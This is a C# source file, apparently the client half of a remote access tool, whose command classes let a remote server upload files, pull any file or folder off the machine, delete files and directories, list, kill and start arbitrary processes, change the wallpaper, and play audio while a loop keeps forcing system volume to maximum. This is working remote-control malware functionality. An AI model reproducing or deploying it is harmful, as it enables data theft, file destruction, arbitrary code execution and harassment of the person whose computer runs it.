using NAudio.Wave;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using VisioForge.Libs.NAudio.CoreAudioApi;

namespace ClientRecive.assets.Commands
{
    public interface ICommand
    {
        Task ExecuteAsync(TcpClient client);
    }
    public class ReciveCommand : ICommand
    {
        public string SavePath;
        private string CurrentDirectory;

        public ReciveCommand(string SavePath)
        {
            this.SavePath = SavePath;
            CurrentDirectory = SavePath;
        }

        public async Task ExecuteAsync(TcpClient client)
        {
            try
            {
                BinaryReader reader = new BinaryReader(client.GetStream());

                string Name = Encoding.UTF8.GetString(Convert.FromBase64String(reader.ReadString()));

                if (Name.Contains("."))
                {
                    await ReciveFileAsync(client, Path.Combine(CurrentDirectory, Name));
                }
                else
                {
                    long TotalBytes = Convert.ToInt64(Encoding.UTF8.GetString(Convert.FromBase64String(reader.ReadString())));
                    await ReciveDirectoryAsync(client, Name);
                }
            }
            catch (SocketException)
            {
                await Console.Out.WriteLineAsync("\nСоединение с сервером потеряно, попытка переподключиться");
                await Start.client.Connect();
            }
            catch (IOException)
            {
                await Console.Out.WriteLineAsync("\nСоединение с сервером потеряно, попытка переподключиться");
                await Start.client.Connect();
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"\nОшибка 1" + ex.Message);
                Console.ResetColor();
            }
        }

        public async Task ReciveDirectoryAsync(TcpClient client, string directory)
        {
            try
            {
                BinaryReader reader = new BinaryReader(client.GetStream());

                int CountDirectories = Convert.ToInt32(Encoding.UTF8.GetString(Convert.FromBase64String(reader.ReadString())));
                int CountFiles = Convert.ToInt32(Encoding.UTF8.GetString(Convert.FromBase64String(reader.ReadString())));

                CurrentDirectory = Path.Combine(CurrentDirectory, directory);
                Directory.CreateDirectory(CurrentDirectory);

                for (int i = 0; i < CountDirectories; i++)
                {
                    await ExecuteAsync(client);
                }

                for (int i = 0; i < CountFiles; i++)
                {
                    await ExecuteAsync(client);
                }

                CurrentDirectory = Directory.GetParent(CurrentDirectory).FullName;
            }
            catch (SocketException)
            {
                await Console.Out.WriteLineAsync("\nСоединение с сервером потеряно, попытка переподключиться");
                await Start.client.Connect();
            }
            catch (IOException)
            {
                await Console.Out.WriteLineAsync("\nСоединение с сервером потеряно, попытка переподключиться");
                await Start.client.Connect();
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"\nОшибка 2" + ex.Message);
                Console.ResetColor();
            }
        }

        public async Task ReciveFileAsync(TcpClient client, string file)
        {
            try
            {
                BinaryReader reader = new BinaryReader(client.GetStream());
                long fileSize = Convert.ToInt64(Encoding.UTF8.GetString(Convert.FromBase64String(reader.ReadString())));

                using (FileStream fileStream = new FileStream(file, FileMode.Create, FileAccess.Write))
                {
                    byte[] buffer = new byte[65536];
                    long totalBytesReceived = 0;
                    int bytesRead;

                    while (totalBytesReceived < fileSize)
                    {
                        int bytesToRead = (int)Math.Min(fileSize - totalBytesReceived, buffer.Length);
                        bytesRead = await client.GetStream().ReadAsync(buffer, 0, bytesToRead);
                        await fileStream.WriteAsync(buffer, 0, bytesRead);
                        totalBytesReceived += bytesRead;
                    }
                }


            }
            catch (SocketException)
            {
                await Console.Out.WriteLineAsync("\nСоединение с сервером потеряно, попытка переподключиться");
                await Start.client.Connect();
            }
            catch (IOException)
            {
                await Console.Out.WriteLineAsync("\nСоединение с сервером потеряно, попытка переподключиться");
                await Start.client.Connect();
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"\nОшибка 3" + ex.Message);
                Console.ResetColor();
            }
        }
    }

    public class SendCommand : ICommand
    {
        public readonly string SendPath;

        public SendCommand(string SendPath)
        {
            this.SendPath = SendPath;
        }

        public async Task ExecuteAsync(TcpClient client)
        {
            if (File.Exists(SendPath))
            {
                await SendFileAsync(client, SendPath, Path.GetFileName(SendPath));
            }
            else
            {
                await SendDirectoryAsync(client, SendPath, Path.GetFileName(SendPath));
            }
        }

        public async Task SendDirectoryAsync(TcpClient client, string directory, string directoryName)
        {
            try
            {
                BinaryWriter writer = new BinaryWriter(client.GetStream());

                writer.Write(Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(directoryName)));
                writer.Write(Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(GetDirectorySize(directory).ToString())));
                writer.Write(Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes((Directory.GetDirectories(directory).Length.ToString()))));
                writer.Write(Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(Directory.GetFiles(directory).Length.ToString())));

                foreach (string subDirectory in Directory.GetDirectories(directory))
                {
                    string subDirectoryName = Path.GetFileName(subDirectory);
                    await SendDirectoryAsync(client, subDirectory, subDirectoryName);
                }

                foreach (string fileName in Directory.GetFiles(directory))
                {
                    await SendFileAsync(client, fileName, Path.GetFileName(fileName));
                }
            }
            catch (SocketException)
            {
                await Console.Out.WriteLineAsync("\nСоединение с сервером потеряно, попытка переподключиться");
                await Start.client.Connect();
            }
            catch (IOException)
            {
                await Console.Out.WriteLineAsync("\nСоединение с сервером потеряно, попытка переподключиться");
                await Start.client.Connect();
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"\nОшибка 4" + ex.Message);
                Console.ResetColor();
            }
        }

        public async Task SendFileAsync(TcpClient client, string file, string fileName)
        {
            try
            {
                if (File.Exists(file))
                {
                    BinaryWriter writer = new BinaryWriter(client.GetStream());

                    FileInfo fileInfo = new FileInfo(file);
                    long fileSize = fileInfo.Length;
                    long totalBytesSent = 0;
                    int bytesSent;

                    writer.Write(Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(fileName)));
                    writer.Write(Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(fileSize.ToString())));

                    using (FileStream fileStream = new FileStream(file, FileMode.Open, FileAccess.Read))
                    {
                        while (totalBytesSent < fileSize)
                        {
                            byte[] buffer = new byte[65536];
                            int bytesRead = await fileStream.ReadAsync(buffer, 0, buffer.Length);
                            totalBytesSent += bytesRead;

                            await client.GetStream().WriteAsync(buffer, 0, bytesRead);
                            bytesSent = bytesRead;
                        }
                    }

                }
                else
                {
                    await Console.Out.WriteLineAsync("Файл не найден по указанному пути");
                }
            }
            catch (SocketException)
            {
                await Console.Out.WriteLineAsync("\nСоединение с сервером потеряно, попытка переподключиться");
                await Start.client.Connect();
            }
            catch (IOException)
            {
                await Console.Out.WriteLineAsync("\nСоединение с сервером потеряно, попытка переподключиться");
                await Start.client.Connect();
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"\nОшибка 5" + ex.Message);
                Console.ResetColor();
            }
        }

        public static long GetDirectorySize(string folderPath)
        {
            DirectoryInfo folder = new DirectoryInfo(folderPath);

            long size = 0;

            foreach (FileInfo file in folder.GetFiles())
            {
                size += file.Length;
            }

            foreach (DirectoryInfo subFolder in folder.GetDirectories())
            {
                size += GetDirectorySize(subFolder.FullName);
            }

            return size;
        }
    }

    public class DeleteReciveCommand : ICommand
    {
        public readonly string RecivePath;

        public DeleteReciveCommand(string RecivePath)
        {
            this.RecivePath = RecivePath;
        }

        public Task ExecuteAsync(TcpClient client)
        {

            if (RecivePath.Contains("."))
            {
                File.Delete(RecivePath);
                Console.WriteLine($"Файл - {Path.GetFileName(RecivePath)} удалён.");
            }
            else
            {
                Console.WriteLine($"Папка - {Path.GetFileName(RecivePath)} удалена.");
                Directory.Delete(RecivePath, true);
            }

            return Task.CompletedTask;
        }
    }

    public class Exists : ICommand
    {
        public readonly string ExistsPath;

        public Exists(string ExistsPath)
        {
            this.ExistsPath = ExistsPath;
        }

        public async Task ExecuteAsync(TcpClient client)
        {
            if (ExistsPath.Contains("."))
            {
                if (File.Exists(ExistsPath))
                {
                    await Client.SendClientMessage(client, "$success");
                }
                else
                {
                    await Client.SendClientMessage(client, "$error");
                }
            }
            else
            {
                if (Directory.Exists(ExistsPath))
                {
                    await Client.SendClientMessage(client, "$success");
                }
                else
                {
                    await Client.SendClientMessage(client, "$error");
                }
            }
        }
    }

    class ProcessCommand : ICommand
    {
        private readonly string Command;
        private readonly string Arguments;

        public ProcessCommand(string Command, string Arguments)
        {
            this.Command = Command;
            this.Arguments = Arguments;
        }

        public ProcessCommand(string Command)
        {
            this.Command = Command;
        }

        public async Task ExecuteAsync(TcpClient client)
        {
            switch (this.Command)
            {
                case "$ProcessKill":

                    await KillProcess(client, Arguments);

                    break;
                case "$GetProcess":

                    await GetProcess(client);

                    break;
                case "$StartProcess":

                    await StartProcess(client, Arguments);

                    break;
                case "$InfoProcess":

                    await InfoProcess(client, Arguments);

                    break;
                default:

                    Console.WriteLine($"Не существует комманды {Command} для работы с процессами");

                    break;
            }
        }

        private Task GetProcess(TcpClient client)
        {
            try
            {
                BinaryWriter writer = new BinaryWriter(client.GetStream());
                Process[] processes = Process.GetProcesses();

                writer.Write(Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(processes.Length.ToString())));

                foreach (var process in processes)
                {
                    try
                    {
                        writer.Write(ProcessSerializer.SerializeProcess(process));
                    }
                    catch (Exception) { }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Ошибка получения списка процессов {ex.Message}");
            }

            return Task.CompletedTask;
        }

        private async Task KillProcess(TcpClient client, string Id)
        {
            try
            {
                Process process = Process.GetProcessById(Convert.ToInt32(Id));
                process.Kill();

                await Client.SendClientMessage(client, "$success");
            }
            catch (Exception)
            {
                await Client.SendClientMessage(client, "$error");
            }

        }

        private async Task StartProcess(TcpClient client, string Arguments)
        {
            try
            {
                if (Arguments.Any(c => c == '|'))
                {
                    string[] Data = Arguments.Split('|');

                    System.Diagnostics.Process.Start(Data[0], Data[1]);
                    await Client.SendClientMessage(client, "$success");
                }
                else
                {
                    System.Diagnostics.Process.Start(Arguments);
                    await Client.SendClientMessage(client, "$success");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Ошибка запуска процесса {ex.Message}");
                await Client.SendClientMessage(client, "$error");
            }
        }

        private Task InfoProcess(TcpClient client, string Value)
        {
            try
            {
                BinaryWriter binaryWriter = new BinaryWriter(client.GetStream());

                if (int.TryParse(Value, out int temp))
                {
                    Process process = Process.GetProcessById(temp);
                    binaryWriter.Write(ProcessSerializer.SerializeProcess(process));
                }
                else
                {
                    Process[] processes = Process.GetProcessesByName(Value);

                    binaryWriter.Write(Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(processes.Length.ToString())));

                    foreach (var process in processes)
                    {
                        binaryWriter.Write(ProcessSerializer.SerializeProcess(process));
                    }
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine($"Ошибка получения информации о процессе {ex.Message}");
            }

            return Task.CompletedTask;
        }

    }

    class MusicCommand : ICommand
    {
        private readonly string PlayPath;

        public MusicCommand(string PlayPath)
        {
            this.PlayPath = PlayPath;
        }

        public async Task ExecuteAsync(TcpClient client)
        {
            try
            {
                if (File.Exists(PlayPath))
                {

                    var deviceEnumerator = new MMDeviceEnumerator();
                    var defaultRenderDevice = deviceEnumerator.GetDefaultAudioEndpoint(DataFlow.Render, Role.Multimedia);

                    CancellationTokenSource cancellationTokenSource = new CancellationTokenSource();
                    CancellationToken cancellationToken = cancellationTokenSource.Token;

                    using (var audioFile = new AudioFileReader(PlayPath))
                    using (var outputDevice = new WaveOutEvent())
                    {
                        outputDevice.Init(audioFile);
                        outputDevice.Play();

                        _ = Task.Factory.StartNew(() =>
                        {
                            while (!cancellationToken.IsCancellationRequested)
                            {
                                if (defaultRenderDevice.AudioEndpointVolume.MasterVolumeLevelScalar < 1.0f)
                                {
                                    defaultRenderDevice.AudioEndpointVolume.MasterVolumeLevelScalar = 1.0f;
                                }
                            }
                        });

                        await Client.SendClientMessage(client, "$success");

                        if (Client.ReceiveMessageFromServer(client).Result is "$Pstop")
                        {
                            outputDevice.Stop();
                            cancellationTokenSource.Cancel();
                            await Client.SendClientMessage(client, "$success");
                        }
                    }
                }
                else
                {
                    await Client.SendClientMessage(client, "$error");
                }
            }
            catch (Exception ex)
            {
                await Client.SendClientMessage(client, "$error");
                Console.WriteLine("Ошибка при проигрывании трека: " + ex.Message);
            }
        }
    }

    class WallpaperCommand : ICommand
    {
        private readonly string PathWallpaper;

        public WallpaperCommand(string Path)
        {
            this.PathWallpaper = Path;
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        const int SPI_SETDESKWALLPAPER = 0x0014;
        const int SPIF_UPDATEINIFILE = 0x01;
        const int SPIF_SENDCHANGE = 0x02;

        public async Task ExecuteAsync(TcpClient client)
        {

            try
            {
                if (File.Exists(PathWallpaper))
                {
                    if (SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, PathWallpaper, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE) != 0)
                    {
                        await Client.SendClientMessage(client, "$success");
                    }
                    else
                    {
                        await Client.SendClientMessage(client, "$error");
                    }
                }
                else
                {
                    await Client.SendClientMessage(client, "$error");
                }
            }
            catch (Exception)
            {
                await Client.SendClientMessage(client, "$error");
            }

        }
    }
}